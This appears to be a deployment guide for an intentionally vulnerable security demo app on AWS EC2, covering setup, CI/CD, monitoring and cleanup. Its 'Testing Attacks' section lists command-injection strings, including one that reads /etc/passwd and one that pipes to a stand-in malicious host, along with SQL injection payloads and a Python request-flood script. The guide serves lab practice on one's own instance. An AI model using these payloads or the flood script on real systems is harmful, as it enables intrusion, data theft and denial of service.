# AWS EC2 Deployment Guide

This guide will help you deploy the security demo application to AWS EC2 for testing DDoS, SQL injection, and script injection attacks.

## 📋 Prerequisites

- AWS Account
- AWS CLI installed and configured (optional, can use AWS Console)
- Basic knowledge of EC2 and security groups

## 🚀 Quick Setup (AWS Console)

## 🔄 CI/CD via GitHub Actions (EC2)

Use the workflow `.github/workflows/deploy-ec2-pipeline.yml` to deploy automatically to an EC2 instance.

**Required GitHub Secrets:**

- `EC2_HOST` – Public IP or DNS of your EC2 instance
- `EC2_USER` – SSH user (default: `ec2-user`)
- `EC2_SSH_KEY` – Private key contents for that user
- `EC2_PORT` – SSH port (default: `22`)

**How it works:**

1. On push to `main` (or manual dispatch), the workflow packages the repo.
2. It uploads the archive to the EC2 host over SCP.
3. It SSHes into the host, installs dependencies, and restarts the app with PM2.

**One-time EC2 prep:**

- Ensure Node.js and PM2 are available (the workflow installs PM2 if missing).
- Ensure the SSH key in `EC2_SSH_KEY` matches the instance key and is allowed in `~/.ssh/authorized_keys`.
- Open SSH (22) and app port (3000) in the instance security group.

**Triggering a deploy:**

- Push to `main` with changes to app/workflow files, or
- Manually run the workflow with the `workflow_dispatch` input for branch selection.

### Step 1: Launch EC2 Instance

1. **Go to EC2 Console**: https://console.aws.amazon.com/ec2/

2. **Launch Instance**:

   - Click "Launch Instance"
   - **Name**: `security-demo-app`
   - **AMI**: Amazon Linux 2023 or Ubuntu Server 22.04 LTS
   - **Instance Type**: `t2.micro` (free tier eligible) or `t3.small` for better performance
   - **Key Pair**: Create or select an existing key pair (save the .pem file!)

3. **Network Settings**:

   - Create or select a security group with these rules:
     - **SSH (22)**: Your IP (for management)
     - **HTTP (80)**: Anywhere (0.0.0.0/0) - optional, for reverse proxy
     - **Custom TCP (3000)**: Anywhere (0.0.0.0/0) - for the Node.js app

   ⚠️ **Security Note**: In a real environment, restrict access. For demos, opening to 0.0.0.0/0 allows you to test from anywhere.

4. **Storage**: 8 GB (default) is sufficient

5. **Click "Launch Instance"**

### Step 2: Connect to Your Instance

**For Windows (using PowerShell):**

```powershell
# Set proper permissions on the key file
icacls "C:\path\to\your-key.pem" /inheritance:r
icacls "C:\path\to\your-key.pem" /grant:r "$($env:USERNAME):(R)"

# Connect via SSH
ssh -i "C:\path\to\your-key.pem" ec2-user@<YOUR-EC2-PUBLIC-IP>
```

**For Linux/Mac:**

```bash
chmod 400 your-key.pem
ssh -i your-key.pem ec2-user@<YOUR-EC2-PUBLIC-IP>
```

### Step 3: Deploy the Application

Once connected to your EC2 instance, run:

```bash
# Download the deployment script
curl -O https://raw.githubusercontent.com/llunet001/workflow-script-injection/main/deploy-ec2.sh

# Make it executable
chmod +x deploy-ec2.sh

# Run the deployment
./deploy-ec2.sh
```

Or manually:

```bash
# Install Node.js
curl -fsSL https://rpm.nodesource.com/setup_18.x | sudo bash -
sudo yum install -y nodejs

# Clone the repository
git clone https://github.com/llunet001/workflow-script-injection.git
cd workflow-script-injection

# Install dependencies
npm install

# Install PM2 (process manager)
sudo npm install -g pm2

# Start the application
pm2 start app.js --name security-demo

# Save PM2 configuration
pm2 save

# Set PM2 to start on boot
pm2 startup
```

### Step 4: Access Your Application

Open your browser and navigate to:

```
http://<YOUR-EC2-PUBLIC-IP>:3000
```

You can find your public IP in the EC2 console or run:

```bash
curl http://169.254.169.254/latest/meta-data/public-ipv4
```

## 🎯 Testing Attacks

### 1. Script Injection

Navigate to the main page and try:

```
google.com; whoami
google.com && cat /etc/passwd
google.com | curl http://malicious-site.com
```

### 2. SQL Injection

In the "User Search" form, try:

```
' OR '1'='1
admin' --
' UNION SELECT id, username, password FROM users --
```

### 3. DDoS Testing

**Using Apache Bench (ab)**:

```bash
# Install Apache Bench
sudo yum install -y httpd-tools  # Amazon Linux
# or
sudo apt-get install -y apache2-utils  # Ubuntu

# Run DDoS simulation (1000 requests, 100 concurrent)
ab -n 1000 -c 100 -p post.txt -T application/x-www-form-urlencoded http://<YOUR-EC2-IP>:3000/heavy-operation
```

Create `post.txt`:

```
dummy=data
```

**Using wrk** (more advanced):

```bash
# Install wrk
sudo yum install -y git gcc make
git clone https://github.com/wg/wrk.git
cd wrk
make
sudo cp wrk /usr/local/bin/

# Run load test (10 threads, 100 connections, 30 seconds)
wrk -t10 -c100 -d30s http://<YOUR-EC2-IP>:3000/
```

**Using Python** (simple flood):

```python
import requests
import concurrent.futures

def make_request(i):
    try:
        r = requests.post('http://<YOUR-EC2-IP>:3000/heavy-operation')
        print(f"Request {i}: {r.status_code}")
    except Exception as e:
        print(f"Request {i} failed: {e}")

# Send 1000 concurrent requests
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(make_request, range(1000))
```

## 📊 Monitoring

**View application logs:**

```bash
pm2 logs security-demo
```

**Check system resources:**

```bash
# CPU and memory usage
htop

# Network connections
netstat -an | grep :3000 | wc -l

# Request count in logs
pm2 logs security-demo | grep "HIGH TRAFFIC"
```

**Monitor with CloudWatch** (Optional):

1. Go to EC2 Console
2. Select your instance
3. Click "Monitoring" tab
4. View CPU, Network, and Disk metrics

## 🛡️ Security Best Practices for Demo Environment

1. **Limit Access**: Update security group to only allow your IP
2. **Set Up Alerts**: Configure CloudWatch alarms for high CPU usage
3. **Regular Snapshots**: Create EBS snapshots before testing
4. **Budget Alerts**: Set up billing alerts in AWS
5. **Shut Down When Not Using**: Stop or terminate instance when done

## 🧹 Cleanup

When you're done with testing:

**Stop the instance (preserves data, minimal cost):**

```bash
# From AWS Console: Select instance → Instance State → Stop
```

**Terminate the instance (removes everything, no cost):**

```bash
# From AWS Console: Select instance → Instance State → Terminate
```

**Delete associated resources:**

- Release Elastic IP (if you allocated one)
- Delete snapshots/volumes (if created)
- Delete security groups (if no longer needed)

## 💰 Cost Estimation

- **t2.micro**: ~$0.0116/hour (~$8.50/month if running 24/7)
- **t3.small**: ~$0.0208/hour (~$15/month if running 24/7)
- **Data Transfer**: First 100GB out is free, then ~$0.09/GB
- **Storage**: ~$0.10/GB-month for EBS

**Tip**: Use the free tier (t2.micro, 750 hours/month for 12 months) if eligible!

## 🆘 Troubleshooting

**Can't connect to port 3000:**

- Check security group allows inbound traffic on port 3000
- Verify app is running: `pm2 status`
- Check if port is listening: `sudo netstat -tlnp | grep 3000`

**App crashes under load:**

- Increase instance size (t3.small or larger)
- Check logs: `pm2 logs security-demo`
- Monitor with: `htop`

**Permission errors:**

- Ensure you're running as ec2-user
- Check file permissions: `ls -la`

## 📚 Additional Resources

- [AWS EC2 Documentation](https://docs.aws.amazon.com/ec2/)
- [PM2 Documentation](https://pm2.keymetrics.io/docs/)
- [Node.js Best Practices](https://github.com/goldbergyoni/nodebestpractices)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
